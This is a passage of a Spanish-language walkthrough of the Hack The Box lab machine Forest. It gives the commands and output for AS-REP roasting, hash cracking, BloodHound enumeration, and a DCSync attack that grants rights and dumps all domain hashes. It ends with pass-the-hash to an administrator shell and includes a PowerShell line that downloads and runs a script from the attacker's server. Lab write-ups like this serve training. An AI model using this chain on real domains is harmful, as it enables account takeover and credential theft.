```
Esta podría ser otra forma de obtener los grupos y usuarios, pero no tan ordenado como con el **servicio RCP**.

Es lo más que obtener por ahora, aunque podemos ir usuario por usuario leyendo su información, sería una pérdida de tiempo por ahora.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando AS-REP Roasting Attack {#ASREP}

¿Qué es el **AS-REP Roasting Attack**?

| **AS-REP Roasting Attack** |
|:-----------:|
| *AS-REP Roasting es una técnica de ataque que aprovecha la forma en que Kerberos maneja las solicitudes de autenticación para ciertas cuentas de usuario. En Kerberos, cuando un usuario intenta autenticarse, envía una solicitud conocida como AS-REQ (Authentication Service Request). Si la cuenta de usuario está configurada para no requerir preautenticación (Do not require Kerberos preauthentication), el controlador de dominio responde con un mensaje AS-REP que incluye información cifrada que puede ser utilizada para descifrar la contraseña del usuario.* |

Por lo que entiendo, al momento de aplicar este ataque, lo que obtenemos es un **TGT** que ya está configurado en una cuenta. Normalmente, estos **TGT** vienen en forma de hash, por lo que debemos aplicar **fuerza bruta** para obtener la contraseña.

Como nosotros ya tenemos una lista de usuarios, podemos probar si alguno de estos es vulnerable a este ataque y, como bien dice la descripción, es necesario que estos tengan activa la instrucción **UF_DONT_REQUIRE_PREAUTH** en el **servicio Kerberos**.

Para aplicar este ataque, vamos a usar la herramienta **GetNPUsers de impacket**.

Tan solo debemos indicarle que no pregunte la contraseña en la autenticación (`-no-pass`) y le indicamos nuestra lista de usuarios (`-userlist`):
```bash
impacket-GetNPUsers -no-pass -usersfile users.txt htb.local/
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User HealthMailboxc3d7722 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfc9daad doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxc0a90c9 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox670628e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox968e74d doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox6ded678 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox83d6781 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfd87238 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxb01ac64 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox7108a4e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox0659cc1 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:2791851ed73b22c9b8667f3e2d5bf4a4$0a3f5555b3752d2ab...
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
```
Excelente, obtuvimos un **TGT** que parece pertenecer al **usuario svc-alfresco**.

Ahora solamente debemos descifrarlo.

Copia y pega el hash completo en un archivo y con **JohnTheRipper**, descifra el hash:
```bash
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)     
1g 0:00:00:04 DONE (2024-10-10 13:24) 0.2070g/s 845913p/s 845913c/s 845913C/s s4161985..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Muy bien, eso fue bastante rápido.

#### Probando Contraseña con crackmapexec y Ganando Acceso con Evil-WinRM {#WMI}

Como ya tenemos la contraseña, vamos a comprobar si nos puede servir utilizando **crackmapexec**:
```bash
crackmapexec smb 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\svc-alfresco:s3rvice
```
Nos mostró un **+**, esto quiere decir, que no nos da un acceso como tal a la máquina, pero sí podemos entrar a enumerar el **servicio SMB**.

Comprobémoslo:
```bash
crackmapexec smb 10.10.10.161 -u 'svc-alfresco' -p 's3rvice' --shares
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\svc-alfresco:s3rvice 
SMB         10.10.10.161    445    FOREST           [+] Enumerated shares
SMB         10.10.10.161    445    FOREST           Share           Permissions     Remark
SMB         10.10.10.161    445    FOREST           -----           -----------     ------
SMB         10.10.10.161    445    FOREST           ADMIN$                          Remote Admin
SMB         10.10.10.161    445    FOREST           C$                              Default share
SMB         10.10.10.161    445    FOREST           IPC$                            Remote IPC
SMB         10.10.10.161    445    FOREST           NETLOGON        READ            Logon server share 
SMB         10.10.10.161    445    FOREST           SYSVOL          READ            Logon server share
```
La idea sería entrar e investigar si encontramos algo en el **NETLOGON o en SYSVOL**, pero te adelanto que no hay nada interesante.

Probemos con el **servicio WinRM**. Si nos muestra el **Pwned!**, sabremos que tenemos acceso a este servicio:
```bash
crackmapexec winrm 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
SMB         10.10.10.161    5985   FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)
HTTP        10.10.10.161    5985   FOREST           [*] http://10.10.10.161:5985/wsman
WINRM       10.10.10.161    5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
```
Parece que podemos entrar a este servicio.

Comprobémoslo con la herramienta **Evil-WinRM**:
```bash
evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
                                        
Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami
htb\svc-alfresco
```
Genial, ya ganamos acceso a la máquina víctima. Busca la flag, debería estar en el escritorio de este usuario.

## Post Explotación {#Post}

### Enumeración de AD Manual en Sesión Activa y Usando ldapdomaindump {#Manual}

Vamos a realizar una enumeración básica del sistema.

Primero, obtengamos los usuarios:
```batch
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net user

User accounts for \\

-------------------------------------------------------------------------------
$331000-VK4ADACQNUCA     Administrator            andy
DefaultAccount           Guest                    HealthMailbox0659cc1
HealthMailbox670628e     HealthMailbox6ded678     HealthMailbox7108a4e
HealthMailbox83d6781     HealthMailbox968e74d     HealthMailboxb01ac64
HealthMailboxc0a90c9     HealthMailboxc3d7722     HealthMailboxfc9daad
HealthMailboxfd87238     krbtgt                   lucinda
mark                     santi                    sebastien
SM_1b41c9286325456bb     SM_1ffab36a2f5f479cb     SM_2c8eef0a09b545acb
SM_681f53d4942840e18     SM_75a538d3025e4db9a     SM_7c96b981967141ebb
SM_9b69f1b9d2cc45549     SM_c75ee099d0a64c91b     SM_ca8c2ed5bdab4dc9b
svc-alfresco
The command completed with one or more errors.
```
Se pueden ver los mismos usuarios que ya habíamos obtenido antes.

Ahora, obtengamos los grupos:
```batch
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net groups

Group Accounts for \\

-------------------------------------------------------------------------------
*$D31000-NSEL5BRJ63V7
*Cloneable Domain Controllers
*Compliance Management
*Delegated Setup
*Discovery Management
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Enterprise Admins
*Enterprise Key Admins
*Enterprise Read-only Domain Controllers
*Exchange Servers
*Exchange Trusted Subsystem
*Exchange Windows Permissions
*ExchangeLegacyInterop
*Group Policy Creator Owners
*Help Desk
*Hygiene Management
*Key Admins
*Managed Availability Servers
*Organization Management
*Privileged IT Accounts
*Protected Users
*Public Folder Management
*Read-only Domain Controllers
*Recipient Management
*Records Management
*Schema Admins
*Security Administrator
*Security Reader
*Server Management
*Service Accounts
*test
*UM Management
*View-Only Organization Management
The command completed with one or more errors.
```
Los mismos grupos que ya habíamos visto.

Veamos la información del usuario actual:
```batch
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net user svc-alfresco
User name                    svc-alfresco
Full Name                    svc-alfresco
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/10/2024 12:35:48 PM
Password expires             Never
Password changeable          10/11/2024 12:35:48 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   10/10/2024 12:04:09 PM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Service Accounts
The command completed successfully.
```
Veo que pertenece a 2 grupos, al grupo **Domain Users** y **Service Accounts**. Me interesa un poco el segundo.

Investiguemos si hay más miembros en el grupo **Service Accounts**:
```batch
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net groups 'Service Accounts'
Group name     Service Accounts
Comment

Members

-------------------------------------------------------------------------------
svc-alfresco
The command completed successfully.
```
Únicamente está nuestro usuario actual. Guardemos esto para después.

Otra cosa que podemos hacer, es dumpear toda la información disponible en el **servicio LDAP**. Esto lo podemos hacer utilizando la herramienta **ldapdomaindump**:

| **ldapdomaindump** |
|:-----------:|
| *La herramienta LDAPdomaindump es utilizada para recolectar y parsear la los datos obtenido de un dominio vía LDAP permitiendo visualizar el resultado en csv, grep y html con lo cual nos permite conocer informacion del Dominio.* |

Aquí puedes encontrar más información de esta herramienta:
* <a href="https://github.com/dirkjanm/ldapdomaindump" target="_blank">Repositorio de dirkjanm: ldapdomaindump</a>
* <a href="https://sniferl4bs.com/2020/02/obteniendo-informaci%C3%B3n-del-dominio-con-ldapdomaindump/" target="_blank">Obteniendo información del dominio con LDAPdomaindump</a>

Usemos la herramienta:
```batch
ldapdomaindump -u 'htb.local\svc-alfresco' -p 's3rvice' 10.10.10.161
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
Puedes ver que se descargaron bastantes archivos.

Para poder visualizarlos, vamos a abrir un servidor en **Python** y, desde el **localhost** en el navegador, entraremos en uno de estos:

<p align="center">
<img src="/assets/images/htb-writeup-forest/Captura1.png">
</p>

Observa que hay bastante información que podemos visitar.

Busquemos el grupo al que pertenece nuestro usuario actual:

<p align="center">
<img src="/assets/images/htb-writeup-forest/Captura2.png">
</p>

Entrando en el **Privileged IT Accounts**, vemos que aparece el grupo que buscamos.

Entremos ahí:

<p align="center">
<img src="/assets/images/htb-writeup-forest/Captura3.png">
</p>

Observa que nos muestra la información del **usuario svc-alfresco**, y ahí podemos ver la instrucción **DONT_REQ_PREAUTH** que nos permitió aplicar el **AS-REP Roasting Attack**.

Si bien podemos seguir buscando y obteniendo información, es mejor usar **BloodHound** para que nos muestre formas en que podemos aprovechar vulnerabilidades encontradas.

En este caso, estaré usando el **BloodHound 4.3.1 y SharpHound 1.1.1**.

### Enumeración de AD con BloodHound {#Blood}

Aquí puedes obtener el **SharpHound**:
* <a href="https://github.com/BloodHoundAD/SharpHound/releases/tag/v2.5.7" target="_blank">Repositorio de BloodHoundAD: SharpHound - Releases</a>

Para este caso, tenemos dos opciones con las que podemos cargar el **SharpHound**:

*Opción 1* - Cargarlo desde un servidor de **Python**:

* Abre un servidor en **Python** en donde tengas el **SharpHound**:
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

* Desde **Evil-WinRM**, vamos a interpretar el contenido del script para cargarlo a la sesión actual como un módulo:
```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents\BHbrsk> IEX(New-Object Net.WebClient).downloadString('http://Tu_IP/SharpHound.ps1')
```
De esta forma, ya debería estar cargado el **SharpHound** como un módulo.

* Para usarlo, puedes ver las funciones que puedes invocar con **grep** en tu máquina:
```bash
cat /opt/SharpHound-v1.1.1/SharpHound.ps1 | grep "Invoke"
function Invoke-BloodHound
        PS C:\> Invoke-BloodHound
        PS C:\> Invoke-BloodHound -Loop -LoopInterval 00:01:00 -LoopDuration 00:10:00
        PS C:\> Invoke-BloodHound -CollectionMethods All
        PS C:\> Invoke-BloodHound -CollectionMethods DCOnly -NoSaveCache -RandomizeFilenames -EncryptZip
        $Assembly.GetType("Costura.AssemblyLoader", $false).GetMethod("Attach", $BindingFlags).Invoke($Null, @())
        $Assembly.GetType("Sharphound.Program").GetMethod("InvokeSharpHound").Invoke($Null, @(,$passed))
```

* Cuando ya sepas qué función usar, aplícala en la sesión de **Evil-WinRM**:
```batch
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents\BHbrsk> Invoke-BloodHound -CollectionMethods All
...
...
```

*Opción 2* - Cargarlo desde la sesión de **Evil-WinRM**:

* Si tienes el binario **SharpHound.exe** en tu directorio de trabajo, tan solo hay que subirlo a la sesión de **Evil-WinRM**:
```batch
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents\BHbrsk> upload SharpHound.exe
Info: Uploading ../content/SharpHound.exe to C:\Users\svc-alfresco\Documents\BHbrsk\SharpHound.exe                                       
Data: 1402880 bytes of 1402880 bytes copied                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents\BHbrsk> dir
*
    Directory: C:\Users\svc-alfresco\Documents\BHbrsk
*
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/10/2024  12:54 PM        1052160 SharpHound.exe
```

* Y listo, ya lo podemos usar:
```batch
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents\BHbrsk> .\SharpHound.exe -c All
2024-10-10T12:56:59.1026939-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
2024-10-10T12:56:59.2589480-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-10-10T12:56:59.2745710-07:00|INFORMATION|Initializing SharpHound at 12:56 PM on 10/10/2024
2024-10-10T12:56:59.4620680-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for htb.local : FOREST.htb.local
2024-10-10T12:56:59.5870704-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-10-10T12:57:00.2120671-07:00|INFORMATION|Beginning LDAP search for htb.local
2024-10-10T12:57:00.2589409-07:00|INFORMATION|Producer has finished, closing LDAP channel
2024-10-10T12:57:00.2589409-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2024-10-10T12:57:30.3371394-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 38 MB RAM
2024-10-10T12:57:44.8840436-07:00|INFORMATION|Consumers finished, closing output channel
2024-10-10T12:57:45.0090438-07:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2024-10-10T12:57:45.1809255-07:00|INFORMATION|Status: 161 objects finished (+161 3.659091)/s -- Using 47 MB RAM
2024-10-10T12:57:45.1809255-07:00|INFORMATION|Enumeration finished in 00:00:44.9765817
2024-10-10T12:57:45.4152926-07:00|INFORMATION|Saving cache with stats: 118 ID to type mappings.
 118 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2024-10-10T12:57:45.4309201-07:00|INFORMATION|SharpHound Enumeration Completed at 12:57 PM on 10/10/2024! Happy Graphing
```

Una vez que obtengamos el **archivo ZIP**, podemos descargarlo desde la sesión de **Evil-WinRM**:
```batch
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents\BHbrsk> download 20241010125743_BloodHound.zip BH.zip
                                        
Info: Downloading C:\Users\svc-alfresco\Documents\BHbrsk\20241010125743_BloodHound.zip to BH.zip
                                        
Info: Download successful!
```

Carguemos el **archivo ZIP** resultante al **BloodHound**:

<p align="center">
<img src="/assets/images/htb-writeup-forest/Captura4.png">
</p>

Muy bien, de aquí podemos encontrar algunas formas en las que podemos escalar privilegios, dependiendo de lo que puede hacer nuestro usuario.

Por ejemplo, aquí podemos ver las cuentas que son vulnerables al **AS-REP Roasting**:

<p align="center">
<img src="/assets/images/htb-writeup-forest/Captura5.png">
</p>

Si buscamos a nuestro **usuario svc-alfresco**, podemos ver con más detalle los grupos a los que pertenece:

<p align="center">
<img src="/assets/images/htb-writeup-forest/Captura6.png">
</p>

Dándole a la opción **objetivos alcanzables de alto valor (reachable high value targets)**, nos muestra todos los grupos que puede alcanzar nuestro usuario. Ahí podemos ver el grupo **PRIVILEGED IT ACCOUNTS**, que ya habíamos visto antes, y su relación con nuestro usuario.

Se puede ver que ese grupo, tiene a su alcance a una computadora que tiene una sesión del Administrador.

Veamos qué nos dice este grupo:

<p align="center">
<img src="/assets/images/htb-writeup-forest/Captura7.png">
</p>

Este grupo puede alcanzar a un grupo que es bastante importante, llamado **ACCOUNT OPERATORS**.

Investiguemos este grupo:

| **Grupo Account Operators** |
|:-----------:|
| *Es un grupo predeterminado que tiene permisos especiales para realizar tareas relacionadas con la gestión de cuentas de usuario y grupos en un entorno de dominio. Este grupo tiene permisos importantes que permiten la administración de ciertos objetos en el dominio, pero sin otorgar acceso total como lo haría un administrador completo del dominio. Debido a que los miembros del grupo Account Operators tienen un nivel considerable de control sobre las cuentas de usuario y algunos recursos en el dominio, es importante tener cuidado al asignar usuarios a este grupo. Un mal uso de estas capacidades podría permitir la creación o modificación de cuentas de usuario de manera que comprometa la seguridad del entorno.* |

Creo que queda bastante claro por dónde debemos buscar para escalar privilegios.

Veamos ese grupo:

<p align="center">
<img src="/assets/images/htb-writeup-forest/Captura8.png">
</p>

Excelente, podemos ver que aparece el privilegio **Generic All**, que indica que este grupo tiene control total sobre dos grupos: el **ENTERPRISE KEY ADMINS y EXCHANGE WINDOWS PERMISSIONS**.

Para este caso, vamos a abusar del grupo **EXCHANGE WINDOWS PERMISSIONS** para escalar privilegios:

| **Grupo Exchange Windows Permissions** |
|:-----------:|
| *El grupo Exchange Windows Permissions en Active Directory está relacionado con la gestión de permisos necesarios para el correcto funcionamiento de Microsoft Exchange Server. Este grupo es creado automáticamente durante la instalación de Exchange y es utilizado para delegar ciertos permisos necesarios para que los servicios de Exchange puedan interactuar con el entorno de Active Directory. El grupo Exchange Windows Permissions tiene un nivel elevado de acceso a los objetos de Active Directory relacionados con Exchange, por lo que es importante gestionarlo cuidadosamente para evitar que usuarios no autorizados obtengan acceso a estos permisos.* |

**BloodHound** te explica cómo hacerlo:

<p align="center">
<img src="/assets/images/htb-writeup-forest/Captura9.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-forest/Captura10.png">
</p>

Lo que nos menciona, es que vamos a aplicar el **DNSync Attack**.

### Creando Usuario para el Grupo Account Operators, Asignandolo al Grupo Exchange Windows Permissions y Aplicando DCSync Attack {#dcsync}

¿Qué es el **DCSync Attack**?

| **DCSync Attack** |
|:-----------:|
| *El DCSync attack es una técnica utilizada en la explotación de Active Directory que permite a un atacante extraer una copia completa de las credenciales de los usuarios (hashes de contraseñas) del controlador de dominio (DC). Este ataque se aprovecha de la funcionalidad del protocolo DRSUAPI (Directory Replication Service Remote Protocol), que es utilizada por los controladores de dominio para sincronizar bases de datos de directorio.* |

Para aplicarlo, necesitaremos cargar **PowerView.ps1**, puedes hacerlo de la forma que quieras como lo mostré antes.

Aquí lo puedes descargar:
* <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" target="_blank">Repositorio de PowerShellMafia: PowerView.ps1</a>

Una vez que lo cargues, asegúrate de qué esté cargado como un módulo a la sesión:
```batch
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents\BHbrsk> Import-Module .\PowerView.ps1
```

Bien, antes de seguir las instrucciones de **BloodHound**, vamos a crear un usuario propio y lo vamos a agregar al grupo **EXCHANGE WINDOWS PERMISSIONS**:
```batch
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents\BHbrsk> net user BrskWngs BrskWngs123$! /add /domain
The command completed successfully.
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents\BHbrsk> net group "Exchange Windows Permissions" BrskWngs /add
The command completed successfully.
```
Si no tuviéramos los privilegios necesarios, esta acción no la habríamos podido realizar.

Comprobemos la creación de nuestro usuario:
```batch
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents\BHbrsk> net user BrskWngs
User name                    BrskWngs
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/10/2024 1:15:49 PM
Password expires             Never
Password changeable          10/11/2024 1:15:49 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Exchange Windows Perm*Domain Users
The command completed successfully.
```

Ahora sí, sigamos las instrucciones que nos indicaron:
```batch
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents\BHbrsk> $SecPassword = ConvertTo-SecureString 'BrskWngs123$!' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents\BHbrsk> $Cred = New-Object System.Management.Automation.PSCredential('htb.local\BrskWngs', $SecPassword)
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents\BHbrsk> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity BrskWngs -Rights DCSync
```
La última instrucción es la que necesita **PowerView.ps1** para ejecutarse. Además, indicamos el dominio de una forma más específica y le indicamos que usará a nuestro usuario que creamos como primera identidad.

Ya solo nos falta dumpear los hashes.

Esto lo podemos realizar con la herramienta **secretsdump de impacket**, tan solo hay que indicarle el dominio, nuestro usuario privilegiado y la IP de la máquina:
```batch
impacket-secretsdump htb.local/BrskWngs@10.10.10.161
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
...
...
...
```
Genial, obtuvimos todos los hashes de todos los usuarios.

Como ya tenemos los hashes, no es tan necesario que los descifremos, pues podemos aplicar el **Pass-The-Hash** para identificarnos como el usuario deseado.

Probemos con el hash del administrador usando **crackmapexec**:
```batch
crackmapexec smb 10.10.10.161 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\Administrator:32693b11e6aa90eb43d32c72a07ceea6 (Pwn3d!)
```
Sí funciona.

Probémoslo con **WinRM** para ver si podemos usar la herramienta **Evil-WinRM**:
```batch
crackmapexec winrm 10.10.10.161 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'
SMB         10.10.10.161    5985   FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)
HTTP        10.10.10.161    5985   FOREST           [*] http://10.10.10.161:5985/wsman
WINRM       10.10.10.161    5985   FOREST           [+] htb.local\Administrator:32693b11e6aa90eb43d32c72a07ceea6 (Pwn3d!)
```
Y si se puede.

También con **crackmapexec**, podemos utilizar el parámetro `--ntds vss` para realizar una copia de seguridad de la **base de datos NTDS.dit** (que almacena las cuentas de usuario y sus hashes de contraseñas en **Active Directory**) utilizando la técnica de **Volume Shadow Copy Service (VSS)**:
```batch
crackmapexec smb 10.10.10.161 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6' --ntds vss
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\Administrator:32693b11e6aa90eb43d32c72a07ceea6 (Pwn3d!)
SMB         10.10.10.161    445    FOREST           [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         10.10.10.161    445    FOREST           htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
SMB         10.10.10.161    445    FOREST           Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.10.161    445    FOREST           DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.10.161    445    FOREST           FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:db2ea542f73cefc4b642d5345c7e83dc:::
SMB         10.10.10.161    445    FOREST           krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
SMB         10.10.10.161    445    FOREST           EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
...
...
...
```
Un ataque tardado, pero exitoso.

Podemos conectarnos a la máquina como administrador usando **PsExec de impacket**, pasándole el dominio, el usuario administrador, la IP de la máquina y el hash completo del administrador:
```batch
impacket-psexec "htb.local/Administrator"@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.10.161.....
[*] Found writable share ADMIN$
[*] Uploading file mjIeKmNq.exe
[*] Opening SVCManager on 10.10.10.161.....
[*] Creating service WmpB on 10.10.10.161.....
[*] Starting service WmpB.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> cd C:\Users\Administrator\Desktop
 
C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 61F2-A88F

 Directory of C:\Users\Administrator\Desktop

09/23/2019  02:15 PM    <DIR>          .
09/23/2019  02:15 PM    <DIR>          ..
10/09/2024  09:01 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)  10,303,787,008 bytes free

C:\Users\Administrator\Desktop> type root.txt
```

Por último, lo probamos con **Evil-WinRM**, indicando el hash de la contraseña del administrador:
```batch
evil-winrm -i 10.10.10.161 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'
                                        
Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
htb\administrator
```
Hemos completado la máquina.
